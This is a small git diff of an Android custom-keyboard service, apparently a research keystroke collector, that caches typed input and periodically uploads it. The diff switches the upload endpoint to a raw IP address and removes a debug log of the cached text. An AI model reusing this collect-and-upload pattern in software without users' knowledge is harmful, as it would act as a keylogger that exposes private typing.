@@ -25,9 +25,9 @@ import hr.fer.connection.PostDataToServer;
 
 public class KeyboardCollectorService extends  InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
-    public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
+    public static final long NOTIFY_INTERVAL = 60 * 1000; // 60 seconds
     private final String PATH = "./cache.txt";
-    private final String SERVER_PATH = "http://collector-env-1.2ta8wpyecx.us-east-2.elasticbeanstalk.com/keyboard/store";
+    private final String SERVER_PATH = "http://161.53.64.201:8080/collector/keyboard/store";
     private File cache;
 
     private KeyboardView kv;
@@ -168,7 +168,6 @@ public class KeyboardCollectorService extends  InputMethodService
         FileInputStream in = new FileInputStream(cache);
         in.read(bytes);
         String contents = new String(bytes);
-        Log.d("cache", contents);
 
         cache.delete();
         cache.createNewFile();
